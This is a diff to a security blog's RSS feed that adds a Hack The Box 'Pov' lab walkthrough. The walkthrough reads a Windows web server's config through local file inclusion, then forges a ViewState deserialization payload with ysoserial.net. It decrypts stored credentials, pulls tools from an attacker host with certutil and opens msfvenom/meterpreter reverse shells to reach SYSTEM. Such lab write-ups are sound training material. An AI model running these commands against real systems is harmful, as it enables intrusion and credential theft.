@@ -6,11 +6,149 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Wed, 22 May 2024 21:18:09 -0500</lastBuildDate>
+        <lastBuildDate>Fri, 07 Jun 2024 12:42:21 -0500</lastBuildDate>
         <atom:link href="https://scorpiosec.com/posts/index.xml" rel="self" type="application/rss+xml" />
         
         <item>
-            <title>HTB Bizness</title>
+            <title>HTB: Pov</title>
+            <link>https://scorpiosec.com/posts/2024/06/htb-pov/</link>
+            <pubDate>Fri, 07 Jun 2024 12:42:21 -0500</pubDate>
+            
+            <guid>https://scorpiosec.com/posts/2024/06/htb-pov/</guid>
+            <description>Platform: Hack The Box Link: Pov Level: Medium OS: Windows Pov starts with a basic static website. After some enumeration, we discover a subdomain leading to an ASP.NET website that turns out to be vulnerable to LFI. Leveraging this vulnerability, we are able to read a critical file exposing sensitive information that we use to exploit the ViewState mechanism of the website, granting us our initial foothold. After exploring the target system, we move laterally to another user after finding and revealing their credentials.</description>
+            <content type="html"><![CDATA[<ul>
+<li>Platform: Hack The Box</li>
+<li>Link: <a href="https://app.hackthebox.com/machines/Pov" target="_blank" >Pov</a>
+
+</li>
+<li>Level: Medium</li>
+<li>OS: Windows</li>
+</ul>
+<hr>
+<p>Pov starts with a basic static website. After some enumeration, we discover a subdomain leading to an ASP.NET website that turns out to be vulnerable to LFI. Leveraging this vulnerability, we are able to read a critical file exposing sensitive information that we use to exploit the <code>ViewState</code> mechanism of the website, granting us our initial foothold. After exploring the target system, we move laterally to another user after finding and revealing their credentials. Finally, we get the root flag by abusing the <code>SeDebugPrivilege</code>.</p>
+<p><strong>A Windows VM with Defender disabled will be needed to reproduce one of the step of the writeup.</strong></p>
+<p>Target IP - <code>10.10.11.251</code></p>
+<h2 id="scanning">Scanning</h2>
+<pre tabindex="0"><code>nmap -sC -sV -oA nmap/Pov 10.10.11.251
+</code></pre><p><strong>Results</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-04-23 14:41 CDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.251
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.055s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">999</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>80/tcp open  http    Microsoft IIS httpd 10.0
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/10.0
+</span></span><span style="display:flex;"><span>|_http-title: pov.htb
+</span></span><span style="display:flex;"><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 23.01 seconds
+</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
+<p>To make the enumeration easier we can add the target to our <code>/etc/hosts</code> file.</p>
+<pre tabindex="0"><code>sudo echo &#34;10.10.11.251 pov.htb&#34; | sudo tee -a /etc/hosts
+</code></pre><p>The scan finds only one open port (80) running <code>http</code>. Visiting <code>http://10.10.11.251/</code> we find a static website offering some security services but no apparent exploitation paths.</p>
+<p><img src="/images/HTB-Pov/pov-website.png" alt="Pov website"></p>
+<p>With ffuf we are able to identify a subdomain.</p>
+<pre tabindex="0"><code>ffuf -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 100 -u http://pov.htb -H &#34;Host: FUZZ.pov.htb&#34; -ic -fs 12330
+</code></pre><p><img src="/images/HTB-Pov/subdomain-pov.png" alt="Pov subdomain"></p>
+<p><code>http://dev.pov.htb/</code> leads to a portfolio website, of a web developer proficient with JS, ASP.NET, and PHP.</p>
+<p><img src="/images/HTB-Pov/portfolio-website.png" alt="Pov portfolio website"></p>
+<p>We are able to download the his CV with the button. We can see that the <code>file</code> parameter is used and it references <code>cv.pdf</code>. We can try to use this for a LFI.</p>
+<p><img src="/images/HTB-Pov/cv-download.png" alt="Pov CV download request"></p>
+<p>On Windows the hosts file is located at: <code>C:\WINDOWS\system32\drivers\etc\hosts</code>.</p>
+<p><img src="/images/HTB-Pov/LFI-hosts-file.png" alt="Pov LFI vulnerability"></p>
+<p>We are actually able to read it! With the help of <code>Wappalyzer</code> we learn that the application is built with ASP.NET and some research tells us that <code>web.config</code> is the configuration file &ldquo;used to manage various settings that define a website&rdquo; in ASP.NET applications. <em>Read more about it <a href="https://www.c-sharpcorner.com/UploadFile/puranindia/Asp-Net-web-configuration-file/" target="_blank" >here</a>
+
+</em>.</p>
+<p><img src="/images/HTB-Pov/web-framework.png" alt="Pov wappalyzer info"></p>
+<p><img src="/images/HTB-Pov/web-config.png" alt="ASP.NET Web config file"></p>
+<p>We are able to successfully read the configuration file. by replacing the <code>file</code> value with <code>/web.config</code>.</p>
+<p><img src="/images/HTB-Pov/web-config-file.png" alt="Web config file read"></p>
+<p>Researching about <code>asp.net machine key exploitation</code> we find <a href="https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter" target="_blank" >this</a>
+
+ HackTricks page explaining how to use a tool call <a href="https://github.com/pwntester/ysoserial.net" target="_blank" >ysoserial.net</a>
+
+ to exploit <code>vIewState</code>.</p>
+<p>Under <code>Testcase 1.5</code> we read that we have to provide two parameters <code>--apppath=&quot;/&quot;</code> and <code>--path=&quot;/hello.aspx&quot;</code>.</p>
+<p>We also need our payload to be base64 encoded, which we get on <a href="https://www.revshells.com/" target="_blank" >revshells</a>
+
+ using <code>PowerShell #3 (Base64)</code> reverse shell.</p>
+<h2 id="initial-foothold">Initial Foothold</h2>
+<p>This tool (<code>ysoserial</code>) is designed for Windows we use a Windows VM with Defender disabled because it flags the tool as malicious. After executing the command below we copy its output and paste it into the <code>ViewState</code> parameter.</p>
+<p><strong>Command example</strong></p>
+<pre tabindex="0"><code>.\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c &#34;&lt;INSERT_REVSHELL_HERE&gt;&#34; --path=&#34;/portfolio/default.aspx&#34; --apppath=&#34;/&#34; --decryptionalg=&#34;AES&#34; --decryptionkey=&#34;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43&#34; --validationalg=&#34;SHA1&#34; --validationkey=&#34;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468&#34;
+</code></pre><p><img src="/images/HTB-Pov/ViewState-payload.png" alt="ViewState Payload"></p>
+<p>We setup our listener and send the request which should result in us catching a shell.</p>
+<p><img src="/images/HTB-Pov/initial-foothold.png" alt="Initial Foothold"></p>
+<p>This account cannot read the user flag but we find a file called <code>connection.xml</code> in <code>C:\Users\sfitz\Documents</code>. It has the credentials for the user <code>alaading</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>&lt;Objs Version<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1.1.0.1&#34;</span> xmlns<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://schemas.microsoft.com/powershell/2004/04&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;Obj RefId<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;TN RefId<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>      &lt;T&gt;System.Management.Automation.PSCredential&lt;/T&gt;
+</span></span><span style="display:flex;"><span>      &lt;T&gt;System.Object&lt;/T&gt;
+</span></span><span style="display:flex;"><span>    &lt;/TN&gt;
+</span></span><span style="display:flex;"><span>    &lt;ToString&gt;System.Management.Automation.PSCredential&lt;/ToString&gt;
+</span></span><span style="display:flex;"><span>    &lt;Props&gt;
+</span></span><span style="display:flex;"><span>      &lt;S N<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UserName&#34;</span>&gt;alaading&lt;/S&gt;
+</span></span><span style="display:flex;"><span>      &lt;SS N<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Password&#34;</span>&gt;01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6&lt;/SS&gt;
+</span></span><span style="display:flex;"><span>    &lt;/Props&gt;
+</span></span><span style="display:flex;"><span>  &lt;/Obj&gt;
+</span></span><span style="display:flex;"><span>&lt;/Objs&gt;
+</span></span></code></pre></div><p>We can see a password value but it is not hashed, rather it uses a Powershell module leveraging secure XML. <em>Read more about it <a href="https://mcpmag.com/articles/2017/07/20/save-and-read-sensitive-data-with-powershell.aspx" target="_blank" >here</a>
+
+</em>.</p>
+<p>We can reveal the password with the commands below.</p>
+<pre tabindex="0"><code>$cred = Import-CliXml C:\Users\sfitz\Documents\connection.xml
+
+$cred.GetNetworkCredential() | fl
+</code></pre><p><img src="/images/HTB-Pov/alaading-creds.png" alt="User alaading user"></p>
+<h3 id="lateral-movement">Lateral Movement</h3>
+<p>With the credentials we can now use <a href="https://github.com/antonioCoco/RunasCs" target="_blank" >RunasCs</a>
+
+ to get to get a shell as the user <code>alaading</code>.</p>
+<p>We send the tool on the target.</p>
+<pre tabindex="0"><code>certutil -urlcache -f http://&lt;IP_address&gt;:&lt;PORT&gt;/RunasCs.exe runascs.exe
+</code></pre><p><img src="/images/HTB-Pov/dl-runascs.png" alt="runascs download"></p>
+<p>After running the command below, we get a shell.</p>
+<pre tabindex="0"><code>.\runascs.exe alaading f8gQ8fynP44ek1m3 cmd.exe -r &lt;IP_address&gt;:&lt;PORT&gt;
+</code></pre><p><img src="/images/HTB-Pov/alaading-shell.png" alt="alaading shell"></p>
+<p>The user flag is available at <code>C:\Users\alaading\desktop\user.txt</code>.</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>We saw that this user has the privilege <code>SeDebugPrivilege</code>. From <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#sedebugprivilege" target="_blank" >HackTricks</a>
+
+, we read that &ldquo;This privilege permits the <strong>debug other processes</strong>, including to read and write in the memory. Various strategies for memory injection, capable of evading most antivirus and host intrusion prevention solutions, can be employed with this privilege.&rdquo;</p>
+<p>We start by generating a payload with msfvenom.</p>
+<pre tabindex="0"><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=IP_address lport=PORT -f exe -a x64 --platform windows -o revshell.exe
+</code></pre><p>We send the executable on the target.</p>
+<pre tabindex="0"><code>certutil -urlcache -f http://&lt;IP_address&gt;:&lt;PORT&gt;/revshell.exe revshell.exe
+</code></pre><p><img src="/images/HTB-Pov/revshell.png" alt="reverse shell file"></p>
+<p>Then open Metasploit, run the <code>mutli/handler</code>, execute the <code>revshell.exe</code> file on the target and you will get a meterpreter session.</p>
+<pre tabindex="0"><code>use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost &lt;IP_address&gt;
+set lport &lt;PORT&gt;
+run
+</code></pre><p><img src="/images/HTB-Pov/meterpreter-session.png" alt="meterpreter session"></p>
+<p>With the <code>ps</code> command we are able to see the processes running on the target and we notice <code>lsass.exe</code>. Since we have <code>SeDebugPrivilege</code> we can migrate to this process.</p>
+<blockquote>
+<p>lsass.exe is a Windows process that <strong>takes care of security policy for the OS</strong>.</p>
+</blockquote>
+<p><img src="/images/HTB-Pov/lsass-process.png" alt="lsass process"></p>
+<p><img src="/images/HTB-Pov/process-migration.png" alt="process migration"></p>
+<p>We use <code>shell</code> to spawn a <code>cmd</code> shell, we are now <code>nt authority\system</code> and the root flag is at <code>C:\Users\Administrator\Desktop\root.txt</code>.</p>
+<p><img src="/images/HTB-Pov/root-flag.png" alt="Root flag"></p>
+<p>A Windows VM is sometimes necessary to run some tools for penetration testing, I highly recommend <a href="https://github.com/mandiant/commando-vm" target="_blank" >CommandoVM</a>
+
+ as it comes with many tools that are not included in Kali Linux. You can follow <a href="https://www.youtube.com/watch?v=nNMEhm8pvPM&amp;ab_channel=Lsecqt" target="_blank" >this video</a>
+
+ for an installation tutorial. I hope this write up was useful to you!</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>HTB: Bizness</title>
             <link>https://scorpiosec.com/posts/2024/05/htb-bizness/</link>
             <pubDate>Wed, 22 May 2024 21:18:09 -0500</pubDate>
             
